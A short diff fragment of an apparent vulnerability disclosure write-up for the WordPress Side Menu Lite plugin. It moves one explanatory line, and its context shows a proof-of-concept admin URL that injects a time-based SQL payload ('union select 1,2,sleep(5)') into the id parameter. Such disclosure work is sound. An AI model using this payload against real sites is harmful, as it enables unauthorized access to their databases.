@@ -45,6 +45,6 @@ if ( $act == "update" ) {
 ```
 ## Proof of Concept
 http://192.168.65.26/wp/wp-admin/admin.php?page=side-menu-lite&tab=add-new&act=duplicate&id=0 union select 1,2,sleep(5)
-Visit this page, it will sleep more than 5 seconds.
 
+Visit this page, it will sleep more than 5 seconds.
 ![blockchain](https://github.com/pang0lin/CVEproject/blob/main/imgs/wordpress_side-menu_sqli.png "Wordpress plugin side-menu sqli")
